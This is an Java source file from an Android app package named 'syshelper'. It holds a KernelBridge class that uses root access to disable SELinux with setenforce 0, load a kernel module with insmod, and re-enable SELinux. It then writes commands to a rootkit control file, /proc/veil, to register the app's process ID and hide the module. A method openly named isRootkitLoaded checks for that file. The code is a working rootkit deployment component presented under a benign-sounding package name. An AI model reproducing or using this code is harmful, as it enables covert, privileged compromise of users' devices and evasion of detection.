package com.syshelper.service;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class KernelBridge {
    private static final String PROC_PATH = "/proc/veil";

    public static boolean isRootkitLoaded() { return new File(PROC_PATH).exists(); }

    public static boolean registerPid(int pid) {
        if (!isRootkitLoaded()) return false;
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "echo \"pid " + pid + "\" > " + PROC_PATH});
            p.waitFor(5, TimeUnit.SECONDS); return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    public static boolean hideModule() {
        if (!isRootkitLoaded()) return false;
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "echo \"hide\" > " + PROC_PATH});
            p.waitFor(5, TimeUnit.SECONDS); return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    public static boolean loadModule(String koPath) {
        try {
            java.lang.Process selinux = Runtime.getRuntime().exec(new String[]{"su", "-c", "setenforce 0"});
            selinux.waitFor(5, TimeUnit.SECONDS);
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "insmod " + koPath});
            p.waitFor(5, TimeUnit.SECONDS);
            java.lang.Process selinux2 = Runtime.getRuntime().exec(new String[]{"su", "-c", "setenforce 1"});
            selinux2.waitFor(5, TimeUnit.SECONDS);
            return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    public static boolean deploy(String koPath) {
        if (!loadModule(koPath)) return false;
        int pid = android.os.Process.myPid();
        if (!registerPid(pid)) return false;
        if (!hideModule()) return false;
        return true;
    }
}
